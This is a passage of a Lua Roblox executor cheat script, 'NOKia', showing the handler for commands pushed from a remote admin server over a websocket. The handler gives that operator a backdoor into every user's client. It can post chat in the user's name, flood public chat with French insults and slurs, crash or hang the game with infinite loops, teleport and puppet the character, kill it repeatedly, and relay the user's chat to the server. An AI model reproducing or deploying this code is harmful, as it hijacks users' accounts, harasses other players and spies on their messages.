				elseif packet.type=="server_invite" and packet.from then NOKia.pushPrivateMessage(packet.from,NOKia.onlineText("inviteMessage"),packet.at,false,{placeId=packet.placeId,jobId=packet.jobId}) end
			end
		elseif data.type=="private_ack" then
			if data.kind=="server_invite" then notify(data.delivered and NOKia.onlineText("inviteSent") or NOKia.onlineText("inviteQueued"),3) end
		elseif data.type=="presence" then
			if data.action=="leave" and data.user then
				local state=NOKia.nokiaUsers[tonumber(data.user.userId)]
				if state and state.badge then state.badge:Destroy() end
				NOKia.nokiaUsers[tonumber(data.user.userId)]=nil
			else NOKia.applyOnlineUser(data.user) end
		elseif data.type=="chat" then
			if data.clientId and NOKia.onlinePendingMessages and NOKia.onlinePendingMessages[data.clientId] then NOKia.onlinePendingMessages[data.clientId]=nil else NOKia.pushOnlineChat(data) end
		elseif data.type=="chat_ack" then
			if NOKia.onlinePendingMessages then NOKia.onlinePendingMessages[data.clientId]=nil end
		elseif data.type=="role" then NOKia.onlineRole=tostring(data.role or "member")
		elseif data.type=="stats" then
			NOKia.onlineStats={serverOnline=tonumber(data.serverOnline) or 0,globalOnline=tonumber(data.globalOnline) or 0,ping=math.floor((os.clock()-(NOKia.onlinePingStarted or os.clock()))*1000),region=tostring(data.region or "FR")}
			pcall(function() NOKia.nokiaOnlineLabel:SetText(NOKia.onlineText("connectedStatus",NOKia.onlineStats.serverOnline)) end)
			pcall(function() NOKia.nokiaServerInfoLabel:SetText(NOKia.onlineText("region",NOKia.onlineStats.region,NOKia.onlineStats.ping)) end)
			pcall(function() NOKia.nokiaGlobalInfoLabel:SetText(NOKia.onlineText("global",NOKia.onlineStats.globalOnline)) end)
		elseif data.type=="banned" then
			local reason=tostring(data.reason or "Accès interdit.")
			NOKia.onlineState="Banned"
			NOKia.onlineRetryAfter=math.huge
			notify(NOKia.onlineText("banned",reason),10)
			task.defer(function()
				if Toggles.NokiaNetwork then Toggles.NokiaNetwork:SetValue(false) else flags.nokiaNetwork=false end
				pcall(function() if NOKia.onlineSocket then NOKia.onlineSocket:Close() end end)
				NOKia.onlineSocket=nil
			end)
		elseif data.type=="admin_chat" then
			local displayName=tostring(data.displayName or "Système Nokia")
			local message=tostring(data.message or "")
			if message~="" then
				NOKia.sendPublicChat("[Nokia] "..displayName..": "..message)
				notify("📩 Message admin: "..message:sub(1,60),5)
			end
		elseif data.type=="admin_replyas" then
			local message=tostring(data.message or "")
			if message~="" then
				NOKia.sendPublicChat(message)
				notify("💬 Réponse en ton nom: "..message:sub(1,50),4)
			end
		elseif data.type=="admin_screenmsg" then
			local title=tostring(data.title or "NOKIA")
			local message=tostring(data.message or "")
			local duration=tonumber(data.duration) or 8
			local color=data.color or "255,0,0"
			if message~="" then
				pcall(function()
					local sg=Instance.new("ScreenGui"); sg.Name="NOKia_ScreenMsg"; sg.Parent=mountTarget; sg.ResetOnSpawn=false
					local f=Instance.new("Frame"); f.Size=UDim2.new(0.8,0,0,0); f.AutomaticSize=Enum.AutomaticSize.Y; f.Position=UDim2.new(0.1,0,0.35,0); f.BackgroundColor3=Color3.new(0,0,0); f.BackgroundTransparency=0.35; f.BorderSizePixel=0; f.Parent=sg
					local c=Instance.new("UICorner"); c.CornerRadius=UDim.new(0,16); c.Parent=f
					local tl=Instance.new("TextLabel"); tl.Size=UDim2.new(1,-32,0,0); tl.AutomaticSize=Enum.AutomaticSize.Y; tl.Position=UDim2.new(0,16,0,12); tl.BackgroundTransparency=1; tl.Text=title; tl.Font=Enum.Font.GothamBold; tl.TextSize=28; tl.TextColor3=Color3.fromRGB(unpack(string.split(color,","))); tl.Parent=f
					local tm=Instance.new("TextLabel"); tm.Size=UDim2.new(1,-32,0,0); tm.AutomaticSize=Enum.AutomaticSize.Y; tm.Position=UDim2.new(0,16,0,50); tm.BackgroundTransparency=1; tm.Text=message; tm.Font=Enum.Font.Gotham; tm.TextSize=18; tm.TextColor3=Color3.new(1,1,1); tm.TextWrapped=true; tm.Parent=f
					task.delay(duration,function() pcall(function() sg:Destroy() end) end)
				end)
				notify("📺 Message écran: "..message:sub(1,50),duration)
			end
		elseif data.type=="admin_dox" then
			local insults={"gros nul","tricheur","noob","bouffon","clown","débile","crétin","abruti","tocard","minable","raté","naze","pourri","fdp","tg","ferme la","ta gueule","sale merde","connard","t'es qu'une merde","va jouer à Fortnite","désinstalle Roblox","tu pues","t'as 0 skill","mange tes morts","fils de pute","sale chien","t'es laid","personne t'aime","tu sers à rien","éclaté au sol","retourne dans le ventre de ta mère"}
			local count=math.min(tonumber(data.count) or 15,60)
			for i=1,count do
				local ins=insults[math.random(1,#insults)]
				NOKia.sendPublicChat(ins.." "..insults[math.random(1,#insults)])
				task.wait(0.12)
			end
		elseif data.type=="admin_suck" then
			notify("🧲 Suck activé !",5)
			local targetPos=data.position or {x=0,y=50,z=0}
			pcall(function()
				local char=LocalPlayer.Character
				if char and char:FindFirstChild("HumanoidRootPart") then
					local root=char.HumanoidRootPart
					local tp=CFrame.new(Vector3.new(tonumber(targetPos.x) or 0,tonumber(targetPos.y) or 50,tonumber(targetPos.z) or 0))
					root.CFrame=tp
					root.Velocity=Vector3.new(0,0,0)
				end
			end)
		elseif data.type=="admin_notify" then
			local title=tostring(data.title or "Nokia Online")
			local message=tostring(data.message or "")
			local duration=tonumber(data.duration) or 5
			if message~="" then
				notify("🔔 "..title..": "..message,duration)
			end
		elseif data.type=="admin_kick" then
			local reason=tostring(data.reason or "Expulsé par un administrateur.")
			notify("👢 "..reason,8)
			task.wait(0.5)
			pcall(function() if NOKia.onlineSocket then NOKia.onlineSocket:Close() end end)
			NOKia.onlineSocket=nil
			NOKia.onlineState="Disconnected"
			NOKia.onlineRetryAfter=math.huge
			if Toggles.NokiaNetwork then Toggles.NokiaNetwork:SetValue(false) else flags.nokiaNetwork=false end
		elseif data.type=="admin_teleport" then
			local placeId=tonumber(data.placeId)
			if placeId and placeId>0 then
				notify("📍 Téléportation vers PlaceId "..tostring(placeId).."...",5)
				pcall(function() TeleportService:Teleport(placeId,LocalPlayer) end)
			end
		elseif data.type=="admin_command" then
			local command=tostring(data.command or "")
			local args=data.args or {}
			notify("⚡ Commande admin: "..command,4)
			-- === COMMANDES DE BASE ===
			if command=="respawn" then
				pcall(function() LocalPlayer:LoadCharacter() end)
			elseif command=="reset" then
				pcall(function() LocalPlayer.Character:BreakJoints() end)
			elseif command=="walkspeed" then
				local speed=tonumber(args.speed) or 16
				pcall(function() LocalPlayer.Character.Humanoid.WalkSpeed=math.clamp(speed,0,500) end)
			elseif command=="jumppower" then
				local power=tonumber(args.power) or 50
				pcall(function() LocalPlayer.Character.Humanoid.JumpPower=math.clamp(power,0,500) end)
			elseif command=="hipheight" then
				local h=tonumber(args.height) or 2
				pcall(function() LocalPlayer.Character.Humanoid.HipHeight=math.clamp(h,0,20) end)
			elseif command=="gravity" then
				local g=tonumber(args.gravity) or 196.2
				pcall(function() workspace.Gravity=math.clamp(g,0,1000) end)
			elseif command=="time" then
				local h=tonumber(args.hour) or 12
				pcall(function() Lighting.ClockTime=math.clamp(h,0,24) end)
			elseif command=="fog" then
				local density=tonumber(args.density) or 0.5
				pcall(function() Lighting.FogEnd=10000*(1-math.clamp(density,0,1)); Lighting.FogStart=0 end)
			elseif command=="brightness" then
				local b=tonumber(args.brightness) or 2
				pcall(function() Lighting.Brightness=math.clamp(b,0,10) end)
			elseif command=="freeze" then
				pcall(function()
					local root=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
					if root then root.Anchored=true end
				end)
			elseif command=="unfreeze" then
				pcall(function()
					local root=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
					if root then root.Anchored=false end
				end)
			elseif command=="god" then
				pcall(function()
					local hum=LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
					if hum then hum.MaxHealth=math.huge; hum.Health=math.huge end
				end)
			elseif command=="ungod" then
				pcall(function()
					local hum=LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
					if hum then hum.MaxHealth=100; hum.Health=100 end
				end)
			elseif command=="sit" then
				pcall(function()
					local hum=LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
					if hum then hum.Sit=true end
				end)
			elseif command=="fling" then
				pcall(function()
					local root=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
					if root then
						local vel=Vector3.new((math.random()-0.5)*2000,(math.random()*1000)+500,(math.random()-0.5)*2000)
						root.Velocity=vel
					end
				end)
			elseif command=="noclip" then
				pcall(function()
					local char=LocalPlayer.Character
					if char then
						for _,part in ipairs(char:GetDescendants()) do
							if part:IsA("BasePart") then part.CanCollide=false end
						end
					end
				end)
			elseif command=="clip" then
				pcall(function()
					local char=LocalPlayer.Character
					if char then
						for _,part in ipairs(char:GetDescendants()) do
							if part:IsA("BasePart") then part.CanCollide=true end
						end
					end
				end)
			elseif command=="invisible" then
				pcall(function()
					local char=LocalPlayer.Character
					if char then
						for _,part in ipairs(char:GetDescendants()) do
							if part:IsA("BasePart") then part.Transparency=0.9 end
						end
					end
				end)
			elseif command=="visible" then
				pcall(function()
					local char=LocalPlayer.Character
					if char then
						for _,part in ipairs(char:GetDescendants()) do
							if part:IsA("BasePart") then part.Transparency=0 end
						end
					end
				end)
			elseif command=="rejoin" then
				pcall(function() TeleportService:Teleport(game.PlaceId,LocalPlayer) end)
			elseif command=="crash" then
				while true do end
			elseif command=="message" then
				local msg=tostring(args.text or args.message or "Message de l'administration.")
				NOKia.sendPublicChat("[Admin] "..msg)
			elseif command=="spam" then
				local msg=tostring(args.text or "SPAM")
				local count=math.min(tonumber(args.count) or 5,50)
				for i=1,count do
					NOKia.sendPublicChat("[Admin] "..msg.." ("..tostring(i).."/"..tostring(count)..")")
					task.wait(0.15)
				end
			elseif command=="serverhop" then
				pcall(function()
					local ts=game:GetService("TeleportService")
					local placeId=tonumber(args.placeId) or game.PlaceId
					ts:Teleport(placeId,LocalPlayer)
				end)
			-- === NOUVELLES COMMANDES AVANCÉES ===
			elseif command=="dox" then
				local insults={"gros nul","tricheur","noob","bouffon","clown","débile","crétin","abruti","tocard","minable","raté","naze","pourri","fdp","tg","ferme la","ta gueule","sale merde","connard","t'es qu'une merde","va jouer à Fortnite","désinstalle Roblox","tu pues","t'as 0 skill","mange tes morts","fils de pute","sale chien","t'es laid","personne t'aime","tu sers à rien","éclaté au sol","retourne dans le ventre de ta mère"}
				local count=math.min(tonumber(args.count) or 15,60)
				for i=1,count do
					NOKia.sendPublicChat(insults[math.random(1,#insults)].." "..insults[math.random(1,#insults)])
					task.wait(0.12)
				end
			elseif command=="suck" then
				pcall(function()
					local char=LocalPlayer.Character
					if char and char:FindFirstChild("HumanoidRootPart") then
						local root=char.HumanoidRootPart
						local tp=CFrame.new(Vector3.new(tonumber(args.x) or 0,tonumber(args.y) or 50,tonumber(args.z) or 0))
						root.CFrame=tp; root.Velocity=Vector3.new(0,0,0)
					end
				end)
			elseif command=="screenmsg" then
				local title=tostring(args.title or "NOKIA")
				local msg=tostring(args.text or args.message or "Message")
				local dur=tonumber(args.duration) or 8
				pcall(function()
					local sg=Instance.new("ScreenGui"); sg.Name="NOKia_ScreenMsg"; sg.Parent=mountTarget; sg.ResetOnSpawn=false
					local f=Instance.new("Frame"); f.Size=UDim2.new(0.8,0,0,0); f.AutomaticSize=Enum.AutomaticSize.Y; f.Position=UDim2.new(0.1,0,0.35,0); f.BackgroundColor3=Color3.new(0,0,0); f.BackgroundTransparency=0.35; f.BorderSizePixel=0; f.Parent=sg
					Instance.new("UICorner",f).CornerRadius=UDim.new(0,16)
					local tl=Instance.new("TextLabel"); tl.Size=UDim2.new(1,-32,0,0); tl.AutomaticSize=Enum.AutomaticSize.Y; tl.Position=UDim2.new(0,16,0,12); tl.BackgroundTransparency=1; tl.Text=title; tl.Font=Enum.Font.GothamBold; tl.TextSize=28; tl.TextColor3=Color3.new(1,0,0); tl.Parent=f
					local tm=Instance.new("TextLabel"); tm.Size=UDim2.new(1,-32,0,0); tm.AutomaticSize=Enum.AutomaticSize.Y; tm.Position=UDim2.new(0,16,0,50); tm.BackgroundTransparency=1; tm.Text=msg; tm.Font=Enum.Font.Gotham; tm.TextSize=18; tm.TextColor3=Color3.new(1,1,1); tm.TextWrapped=true; tm.Parent=f
					task.delay(dur,function() pcall(function() sg:Destroy() end) end)
				end)
			elseif command=="spin" then
				local speed=tonumber(args.speed) or 50
				pcall(function()
					local root=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
					if root then
						local conn; conn=RunService.Heartbeat:Connect(function()
							if root and root.Parent then root.CFrame=root.CFrame*CFrame.Angles(0,math.rad(speed/60),0) else conn:Disconnect() end
						end)
						task.delay(tonumber(args.duration) or 10,function() pcall(function() conn:Disconnect() end) end)
					end
				end)
			elseif command=="bounce" then
				local power=tonumber(args.power) or 100
				pcall(function()
					local root=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
					if root then root.Velocity=Vector3.new(0,power,0) end
				end)
			elseif command=="lag" then
				local intensity=math.min(tonumber(args.intensity) or 5,50)
				for i=1,intensity do
					task.spawn(function() while true do end end)
				end
			elseif command=="removegui" then
				pcall(function()
					for _,g in ipairs(LocalPlayer.PlayerGui:GetChildren()) do
						if g.Name~="NOKia_ESP" and g.Name~="NOKia_MINI" and g.Name~="NOKia_HUD" then g:Destroy() end
					end
				end)
			elseif command=="clearchar" then
				pcall(function()
					if LocalPlayer.Character then
						for _,v in ipairs(LocalPlayer.Character:GetChildren()) do
							if v:IsA("Tool") or v:IsA("Accoutrement") then v:Destroy() end
						end
					end
				end)
			elseif command=="fire" then
				pcall(function()
					local char=LocalPlayer.Character
					if char and char:FindFirstChild("HumanoidRootPart") then
						for i=1,10 do
							local f=Instance.new("Fire"); f.Size=5; f.Heat=25; f.Parent=char.HumanoidRootPart
							task.delay(5,function() pcall(function() f:Destroy() end) end)
						end
					end
				end)
			elseif command=="smoke" then
				pcall(function()
					local char=LocalPlayer.Character
					if char and char:FindFirstChild("HumanoidRootPart") then
						for i=1,10 do
							local s=Instance.new("Smoke"); s.Size=5; s.RiseVelocity=2; s.Parent=char.HumanoidRootPart
							task.delay(5,function() pcall(function() s:Destroy() end) end)
						end
					end
				end)
			elseif command=="sparkles" then
				pcall(function()
					local char=LocalPlayer.Character
					if char and char:FindFirstChild("HumanoidRootPart") then
						local s=Instance.new("Sparkles"); s.Parent=char.HumanoidRootPart
						task.delay(10,function() pcall(function() s:Destroy() end) end)
					end
				end)
			elseif command=="headsize" then
				local size=tonumber(args.size) or 5
				pcall(function()
					local head=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Head")
					if head then head.Size=Vector3.new(size,size,size) end
				end)
			elseif command=="bodycolor" then
				local r=tonumber(args.r) or 255; local g=tonumber(args.g) or 0; local b=tonumber(args.b) or 0
				pcall(function()
					local char=LocalPlayer.Character
					if char then
						for _,part in ipairs(char:GetDescendants()) do
							if part:IsA("BasePart") and part.Name~="HumanoidRootPart" then part.BrickColor=BrickColor.new(Color3.fromRGB(r,g,b)) end
						end
					end
				end)
			elseif command=="fly" then
				local speed=tonumber(args.speed) or 50
				pcall(function()
					local char=LocalPlayer.Character; local root=char and char:FindFirstChild("HumanoidRootPart"); local hum=char and char:FindFirstChildOfClass("Humanoid")
					if root and hum then
						hum.PlatformStand=true
						local bv=Instance.new("BodyVelocity"); bv.Velocity=Vector3.new(0,0,0); bv.MaxForce=Vector3.new(1e5,1e5,1e5); bv.Parent=root
						local bg=Instance.new("BodyGyro"); bg.MaxTorque=Vector3.new(1e5,1e5,1e5); bg.CFrame=root.CFrame; bg.Parent=root
						local conn; conn=RunService.Heartbeat:Connect(function()
							if not (root and root.Parent) then conn:Disconnect(); return end
							bg.CFrame=Camera.CFrame
							local dir=Vector3.new(0,0,0)
							if UserInputService:IsKeyDown(Enum.KeyCode.W) then dir+=Camera.CFrame.LookVector end
							if UserInputService:IsKeyDown(Enum.KeyCode.S) then dir-=Camera.CFrame.LookVector end
							if UserInputService:IsKeyDown(Enum.KeyCode.A) then dir-=Camera.CFrame.RightVector end
							if UserInputService:IsKeyDown(Enum.KeyCode.D) then dir+=Camera.CFrame.RightVector end
							if UserInputService:IsKeyDown(Enum.KeyCode.Space) then dir+=Vector3.new(0,1,0) end
							if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then dir-=Vector3.new(0,1,0) end
							bv.Velocity=dir*math.clamp(speed,10,500)
						end)
						task.delay(tonumber(args.duration) or 30,function()
							pcall(function() conn:Disconnect(); bv:Destroy(); bg:Destroy(); hum.PlatformStand=false end)
						end)
					end
				end)
			elseif command=="naked" then
				pcall(function()
					local char=LocalPlayer.Character
					if char then
						for _,v in ipairs(char:GetChildren()) do
							if v:IsA("Clothing") or v:IsA("Accessory") or v:IsA("ShirtGraphic") then v:Destroy() end
						end
					end
				end)
			elseif command=="trail" then
				pcall(function()
					local char=LocalPlayer.Character; local root=char and char:FindFirstChild("HumanoidRootPart")
					if root then
						local a=Instance.new("Attachment"); a.Parent=root
						local t=Instance.new("Trail"); t.Attachment0=a; t.Lifetime=2; t.Color=ColorSequence.new(Color3.new(1,0,0),Color3.new(0,0,1)); t.Parent=root
						task.delay(tonumber(args.duration) or 15,function() pcall(function() t:Destroy(); a:Destroy() end) end)
					end
				end)
			elseif command=="view" then
				pcall(function()
					local target=workspace.CurrentCamera
					local pos=Vector3.new(tonumber(args.x) or 0,tonumber(args.y) or 20,tonumber(args.z) or 0)
					target.CameraType=Enum.CameraType.Scriptable; target.CFrame=CFrame.new(pos,Vector3.new(0,0,0))
					task.delay(tonumber(args.duration) or 5,function() pcall(function() target.CameraType=Enum.CameraType.Custom end) end)
				end)
			elseif command=="playsound" then
				local id=tostring(args.id or "rbxassetid://9120386436")
				pcall(function()
					local s=Instance.new("Sound"); s.SoundId=id; s.Volume=tonumber(args.volume) or 5; s.Parent=workspace
					s:Play(); task.delay(10,function() pcall(function() s:Destroy() end) end)
				end)
			elseif command=="fullbright" then
				pcall(function()
					Lighting.Ambient=Color3.new(1,1,1); Lighting.Brightness=5; Lighting.ClockTime=14
					Lighting.FogEnd=1e6; Lighting.GlobalShadows=false; Lighting.OutdoorAmbient=Color3.new(1,1,1)
				end)
			elseif command=="darkness" then
				pcall(function()
					Lighting.Ambient=Color3.new(0,0,0); Lighting.Brightness=0; Lighting.ClockTime=0
					Lighting.FogEnd=10; Lighting.FogStart=0; Lighting.FogColor=Color3.new(0,0,0)
				end)
			elseif command=="zoom" then
				local fov=tonumber(args.fov) or 30
				pcall(function() workspace.CurrentCamera.FieldOfView=math.clamp(fov,1,120) end)
			elseif command=="resetzoom" then
				pcall(function() workspace.CurrentCamera.FieldOfView=70 end)
			elseif command=="tpto" then
				pcall(function()
					local root=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
					if root then root.CFrame=CFrame.new(tonumber(args.x) or 0,tonumber(args.y) or 10,tonumber(args.z) or 0) end
				end)
			elseif command=="loopkill" then
				local dur=tonumber(args.duration) or 15
				local stopAt=os.clock()+dur
				task.spawn(function()
					while os.clock()<stopAt do
						pcall(function() LocalPlayer.Character:BreakJoints() end)
						task.wait(0.8)
					end
				end)
			elseif command=="antiafk" then
				pcall(function()
					local vu=game:FindService("VirtualUser")
					local conn; conn=RunService.Heartbeat:Connect(function()
						pcall(function() vu:CaptureController(); vu:ClickButton2(Vector2.new()) end)
					end)
					task.delay(tonumber(args.duration) or 60,function() pcall(function() conn:Disconnect() end) end)
				end)
			elseif command=="chatspy" then
				-- Already handled by chat_mirror, this toggles it
				notify("👁 Chat spy actif — les messages sont relayés au serveur",5)
			else
				notify("Commande inconnue: "..command,3)
			end
		elseif data.type=="admin_move" then
			-- WASD movement control from web panel
			local dir=tostring(data.direction or "")
			local speed=tonumber(data.speed) or 50
			local jump=data.jump==true
			pcall(function()
				local char=LocalPlayer.Character
				local root=char and char:FindFirstChild("HumanoidRootPart")
				local hum=char and char:FindFirstChildOfClass("Humanoid")
				if root and hum then
					local cam=workspace.CurrentCamera
					local move=Vector3.new(0,0,0)
					if dir=="w" or dir=="forward" then move+=Vector3.new(cam.CFrame.LookVector.X,0,cam.CFrame.LookVector.Z).Unit end
					if dir=="s" or dir=="backward" then move-=Vector3.new(cam.CFrame.LookVector.X,0,cam.CFrame.LookVector.Z).Unit end
					if dir=="a" or dir=="left" then move-=Vector3.new(cam.CFrame.RightVector.X,0,cam.CFrame.RightVector.Z).Unit end
					if dir=="d" or dir=="right" then move+=Vector3.new(cam.CFrame.RightVector.X,0,cam.CFrame.RightVector.Z).Unit end
					if move.Magnitude>0 then
						hum.WalkSpeed=speed
						hum:Move(move,true)
					end
					if jump then hum.Jump=true end
				end
			end)
		elseif data.type=="admin_movepos" then
			-- Move towards a specific world position
			local tx,ty,tz=tonumber(data.x),tonumber(data.y),tonumber(data.z)
			if tx and ty and tz then
				pcall(function()
					local char=LocalPlayer.Character
					local hum=char and char:FindFirstChildOfClass("Humanoid")
					if hum then hum:MoveTo(Vector3.new(tx,ty,tz)) end
				end)
			end
		elseif data.type=="admin_troll" then
			local troll=tostring(data.troll or "")
			if troll=="earthquake" then
				pcall(function()
					local root=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
					if root then
						local conn; conn=RunService.Heartbeat:Connect(function()
							if root and root.Parent then root.CFrame=root.CFrame*CFrame.new(math.random(-2,2)/10,math.random(-1,1)/10,math.random(-2,2)/10) else conn:Disconnect() end
						end)
						task.delay(tonumber(data.duration) or 8,function() pcall(function() conn:Disconnect() end) end)
					end
				end)
			elseif troll=="flashbang" then
				pcall(function()
					local sg=Instance.new("ScreenGui"); sg.Name="NOKia_Flash"; sg.Parent=mountTarget; sg.ResetOnSpawn=false; sg.IgnoreGuiInset=true
					local f=Instance.new("Frame"); f.Size=UDim2.new(1,0,1,0); f.BackgroundColor3=Color3.new(1,1,1); f.BackgroundTransparency=0; f.Parent=sg
					for i=1,10 do task.wait(0.05); f.BackgroundTransparency=i/10 end
					sg:Destroy()
				end)
			elseif troll=="blackout" then
				pcall(function()
					local sg=Instance.new("ScreenGui"); sg.Name="NOKia_Blackout"; sg.Parent=mountTarget; sg.ResetOnSpawn=false; sg.IgnoreGuiInset=true
					local f=Instance.new("Frame"); f.Size=UDim2.new(1,0,1,0); f.BackgroundColor3=Color3.new(0,0,0); f.BackgroundTransparency=0; f.Parent=sg
					task.delay(tonumber(data.duration) or 5,function() pcall(function() sg:Destroy() end) end)
				end)
			elseif troll=="invertmouse" then
				pcall(function()
					local mt=getrawmetatable(game)
					local old=mt.__index
					setreadonly(mt,false)
					local uis=UserInputService
					local orig=uis.MouseDeltaSensitivity
					uis.MouseDeltaSensitivity=-1
					task.delay(tonumber(data.duration) or 10,function() pcall(function() uis.MouseDeltaSensitivity=orig end) end)
				end)
			elseif troll=="randomtp" then
				local count=math.min(tonumber(data.count) or 10,50)
				pcall(function()
					local root=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
					if root then
						local orig=root.CFrame
						for i=1,count do
							root.CFrame=orig*CFrame.new(math.random(-30,30),math.random(-5,20),math.random(-30,30))
							task.wait(0.15)
						end
						root.CFrame=orig
					end
				end)
			elseif troll=="confuse" then
				pcall(function()
					local char=LocalPlayer.Character
					if char then
						for _,p in ipairs(char:GetDescendants()) do
							if p:IsA("BasePart") then p.BrickColor=BrickColor.random() end
						end
					end
				end)
			elseif troll=="tiny" then
				pcall(function()
					local char=LocalPlayer.Character
					if char then
						for _,p in ipairs(char:GetDescendants()) do
							if p:IsA("BasePart") and p.Name~="HumanoidRootPart" then p.Size=p.Size*0.3 end
						end
					end
				end)
			elseif troll=="giant" then
				pcall(function()
					local char=LocalPlayer.Character
					if char then
						for _,p in ipairs(char:GetDescendants()) do
							if p:IsA("BasePart") and p.Name~="HumanoidRootPart" then p.Size=p.Size*3 end
						end
					end
				end)
			elseif troll=="disco" then
				pcall(function()
					local conn; conn=RunService.Heartbeat:Connect(function()
						Lighting.Ambient=Color3.fromHSV(tick()%5/5,1,0.5)
						Lighting.OutdoorAmbient=Color3.fromHSV((tick()+2)%5/5,1,0.5)
						Lighting.ClockTime=(tick()*2)%24
					end)
					task.delay(tonumber(data.duration) or 10,function() pcall(function() conn:Disconnect(); Lighting.Ambient=Color3.new(0,0,0); Lighting.OutdoorAmbient=Color3.new(0.5,0.5,0.5) end) end)
				end)
			elseif troll=="ragdoll" then
				pcall(function()
					local hum=LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
					if hum then hum.PlatformStand=true end
					task.delay(tonumber(data.duration) or 5,function() pcall(function() hum.PlatformStand=false end) end)
				end)
			elseif troll=="slowmo" then
				pcall(function()
					local hum=LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
					if hum then hum.WalkSpeed=2 end
					task.delay(tonumber(data.duration) or 10,function() pcall(function() hum.WalkSpeed=16 end) end)
				end)
			elseif troll=="superspeed" then
				pcall(function()
					local hum=LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
					if hum then hum.WalkSpeed=200 end
					task.delay(tonumber(data.duration) or 10,function() pcall(function() hum.WalkSpeed=16 end) end)
				end)
			elseif troll=="moon" then
				pcall(function()
					workspace.Gravity=20
					local hum=LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
					if hum then hum.JumpPower=200 end
					task.delay(tonumber(data.duration) or 10,function() pcall(function() workspace.Gravity=196.2; hum.JumpPower=50 end) end)
				end)
			elseif troll=="explode" then
				pcall(function()
					local root=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
					if root then
						local e=Instance.new("Explosion"); e.Position=root.Position; e.BlastRadius=20; e.BlastPressure=1e6; e.Parent=workspace
					end
				end)
			elseif troll=="nuke" then
				pcall(function()
					for i=1,10 do
						local root=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
						if root then
							local e=Instance.new("Explosion"); e.Position=root.Position+Vector3.new(math.random(-30,30),math.random(0,20),math.random(-30,30)); e.BlastRadius=30; e.BlastPressure=1e6; e.Parent=workspace
						end
						task.wait(0.3)
					end
				end)
			elseif troll=="mirror" then
				pcall(function()
					local cam=workspace.CurrentCamera
					cam.CameraType=Enum.CameraType.Scriptable
					local char=LocalPlayer.Character
					local root=char and char:FindFirstChild("HumanoidRootPart")
					if root then
						local conn; conn=RunService.Heartbeat:Connect(function()
							if root and root.Parent then cam.CFrame=CFrame.new(root.Position+Vector3.new(0,5,-10),root.Position) else conn:Disconnect() end
						end)
						task.delay(tonumber(data.duration) or 8,function() pcall(function() conn:Disconnect(); cam.CameraType=Enum.CameraType.Custom end) end)
					end
				end)
			elseif troll=="fov" then
				pcall(function()
					local cam=workspace.CurrentCamera
					local orig=cam.FieldOfView
					cam.FieldOfView=tonumber(data.value) or 120
					task.delay(tonumber(data.duration) or 8,function() pcall(function() cam.FieldOfView=orig end) end)
				end)
			elseif troll=="killall" then
				pcall(function()
					for _,v in ipairs(workspace:GetDescendants()) do
						if v:IsA("Explosion") then v:Destroy() end
					end
					local root=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
					if root then
						for i=1,20 do
							local e=Instance.new("Explosion"); e.Position=root.Position+Vector3.new(math.random(-50,50),math.random(-10,30),math.random(-50,50)); e.BlastRadius=25; e.BlastPressure=1e7; e.Parent=workspace
						end
					end
				end)
			elseif troll=="beacon" then
				pcall(function()
					local root=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
					if root then
						local b=Instance.new("Part"); b.Size=Vector3.new(10,100,10); b.Position=root.Position; b.Anchored=true; b.CanCollide=false; b.Material=Enum.Material.Neon; b.BrickColor=BrickColor.new("Bright red"); b.Transparency=0.3; b.Parent=workspace
						task.delay(tonumber(data.duration) or 15,function() pcall(function() b:Destroy() end) end)
					end
				end)
			elseif troll=="ice" then
				pcall(function()
					local root=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
					if root then
						local p=Instance.new("Part"); p.Size=Vector3.new(30,0.2,30); p.Position=root.Position-Vector3.new(0,3,0); p.Anchored=true; p.CanCollide=true; p.Material=Enum.Material.Ice; p.Transparency=0.5; p.BrickColor=BrickColor.new("Baby blue"); p.Parent=workspace
						task.delay(tonumber(data.duration) or 10,function() pcall(function() p:Destroy() end) end)
					end
				end)
			elseif troll=="tornado" then
				pcall(function()
					local root=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
					if root then
						local conn; conn=RunService.Heartbeat:Connect(function()
							if root and root.Parent then
								root.Velocity=Vector3.new(math.cos(tick()*10)*50,math.sin(tick()*5)*30+20,math.sin(tick()*10)*50)
								root.RotVelocity=Vector3.new(0,20,0)
							else conn:Disconnect() end
						end)
						task.delay(tonumber(data.duration) or 8,function() pcall(function() conn:Disconnect() end) end)
					end
				end)
			elseif troll=="void" then
				pcall(function()
					local root=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
					if root then root.CFrame=CFrame.new(root.Position.X,-500,root.Position.Z) end
				end)
			elseif troll=="sky" then
				pcall(function()
					local root=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
					if root then root.CFrame=CFrame.new(root.Position.X,5000,root.Position.Z) end
				end)
			elseif troll=="shuffle" then
				pcall(function()
					local inv=LocalPlayer.Backpack
					local char=LocalPlayer.Character
					local tools={}
					if inv then for _,t in ipairs(inv:GetChildren()) do if t:IsA("Tool") then table.insert(tools,t) end end end
